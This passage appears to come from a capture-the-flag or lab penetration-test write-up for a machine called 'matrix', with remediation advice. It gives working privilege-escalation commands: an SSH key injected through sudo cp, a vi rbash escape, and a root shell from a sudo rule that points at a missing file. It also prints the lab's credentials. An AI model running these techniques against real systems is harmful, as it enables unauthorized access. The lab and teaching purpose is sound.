[8] PRIVILEGE ESCALATION — guest → trinity (sudo cp abuse)
================================================================================

sudo -l

# User guest may run the following commands on matrix:
#     (root)    NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
#     (trinity) NOPASSWD: /bin/cp

# guest can run /bin/cp AS trinity with no password.
# /bin/cp can overwrite any file writable by trinity — including
# ~/.ssh/authorized_keys. This allows key injection for passwordless SSH.

# Step 1: Generate an SSH key pair as guest
ssh-keygen      # accept defaults; keys land in ~/.ssh/

# Step 2: Make the public key world-readable (cp as trinity needs to read it)
chmod 777 ~/.ssh/id_rsa.pub

# Step 3: Stage the public key from home directory
cp ~/.ssh/id_rsa.pub /home/guest/id_rsa.pub

# Step 4: Overwrite trinity's authorized_keys via sudo cp
sudo -u trinity /bin/cp /home/guest/id_rsa.pub /home/trinity/.ssh/authorized_keys

# Step 5: SSH in as trinity using our private key
ssh trinity@127.0.0.1 -i ~/.ssh/id_rsa -p 6464

trinity@matrix:~$ whoami
trinity

[12] VULNERABILITIES IDENTIFIED
================================================================================

1. CREDENTIALS IN UNAUTHENTICATED WEB DIRECTORY — secret.gz (High)
   Detail   : A file containing admin:MD5hash was stored inside a deeply
              nested but publicly accessible directory tree under /Matrix
              on port 80. Path depth provides no meaningful security.
   Impact   : Any attacker running a recursive crawler obtained credentials
              for the authenticated port 7331 service.
   Fix      : Never store credential or configuration files within the web
              root. Serve sensitive material only over authenticated endpoints.

2. WEAK MD5 PASSWORD HASH (High)
   Detail   : The admin password was hashed using plain unsalted MD5, and
              the plaintext ("passwd") is trivially common.
   Impact   : Reversed instantly with a free online MD5 lookup — no
              computational effort required.
   Fix      : Use bcrypt, scrypt, or Argon2 for all password storage.
              Enforce strong passwords and reject entries from known wordlists.

3. CREDENTIALS HARDCODED IN DISTRIBUTED .NET BINARY (High)
   Detail   : SSH credentials (guest:7R1n17yN30) were embedded as a string
              literal in a .NET assembly served over HTTP. monodis
              decompiles the binary to readable IL in seconds.
   Impact   : SSH access was obtained with a single grep command.
   Fix      : Never hardcode credentials in application code or binaries.
              Use environment variables or a secrets manager at runtime.
              Treat any distributed binary as fully reversible.

4. RESTRICTED SHELL BYPASS VIA vi GTFOBins (Medium)
   Detail   : The guest account used rbash with only /home/guest/prog in
              PATH. vi was the sole permitted binary. vi supports arbitrary
              shell execution via :!/bin/sh — a well-documented GTFOBins
              technique — rendering the restriction ineffective.
   Impact   : rbash was bypassed in under 10 seconds.
   Fix      : Never permit editors (vi, vim, nano, less, more, awk, etc.)
              in a restricted shell. Verify all permitted binaries against
              GTFOBins. Prefer ForceCommand or containerised shells over
              rbash for restricted access.

5. PRIVILEGE ESCALATION VIA sudo cp — guest → trinity (High)
   Detail   : guest was permitted to run /bin/cp as trinity with no
              password. cp can write to any path writable by trinity,
              including ~/.ssh/authorized_keys.
   Impact   : Full lateral movement to trinity with no interaction from
              the trinity account required.
   Fix      : Never grant sudo permission for file-manipulation utilities
              (cp, mv, rsync, scp). Audit all sudo rules for unintended
              write paths. Verify against GTFOBins before deployment.

6. PRIVILEGE ESCALATION VIA MISSING sudo TARGET — trinity → root (Critical)
   Detail   : trinity was permitted to run /home/trinity/oracle as root.
              The file did not exist, and trinity owned her home directory,
              allowing her to create oracle with arbitrary content.
   Impact   : Immediate root shell via echo "/bin/sh" > oracle && sudo ./oracle
   Fix      : Verify all files referenced in sudo rules exist before
              deployment and are owned by root. Ensure the containing
              directory is not writable by the permitted user. Regularly
              audit /etc/sudoers for rules referencing writable or
              non-existent paths.

================================================================================
[13] SECURITY RECOMMENDATIONS
================================================================================

1. Web Application & Secret Management
   - Never place credential files inside the web root at any directory depth
   - Serve sensitive files only over authenticated, access-controlled endpoints
   - Use a dedicated secrets manager (e.g. HashiCorp Vault) for all credentials
   - Never embed credentials in distributed binaries or application source code

2. Password Security
   - Enforce strong, unique passwords; reject entries from common wordlists
   - Use bcrypt, scrypt, or Argon2 for all password hashing
   - Never use plain or salted MD5/SHA-1 for password storage
   - Rotate credentials regularly and audit for cross-service reuse

3. SSH & Shell Hardening
   - Run SSH on a non-default port and restrict via firewall / VPN
   - Validate all rbash permitted binaries against GTFOBins
   - Prefer SSH ForceCommand or containerised shells over rbash
   - Bind SSH key authentication to specific source IPs where possible

4. sudo Hardening
   - Audit all sudo rules with visudo; apply principle of least privilege
   - Never permit file-manipulation utilities (cp, mv, rsync) as sudo targets
   - Ensure all sudo-permitted files exist, are root-owned, and reside in
     directories not writable by the permitted user
   - Re-audit /etc/sudoers after every system or user configuration change

5. Defense in Depth
   - Segment networks to restrict access to internal services by port
   - Enable fail2ban or equivalent on all externally reachable services
   - Centralise logging (web access, SSH, sudo, shell) and alert on anomalies
